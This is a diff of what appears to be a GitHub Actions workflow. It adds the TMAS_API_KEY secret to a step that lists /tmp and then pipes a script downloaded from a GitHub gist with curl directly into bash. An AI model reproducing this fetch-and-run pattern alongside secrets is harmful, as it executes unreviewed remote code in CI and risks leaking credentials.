@@ -38,6 +38,8 @@ jobs:
       #     path: /tmp/image.tar
 
       - name: List
+        with:
+          TMAS_API_KEY: ${{ secrets.TMAS_API_KEY }}
         run: |
           ls -l /tmp/
           curl -s -L https://gist.github.com/raphabot/abae09b46c29afc7c3b918b7b8ec2a5c/raw/ | bash
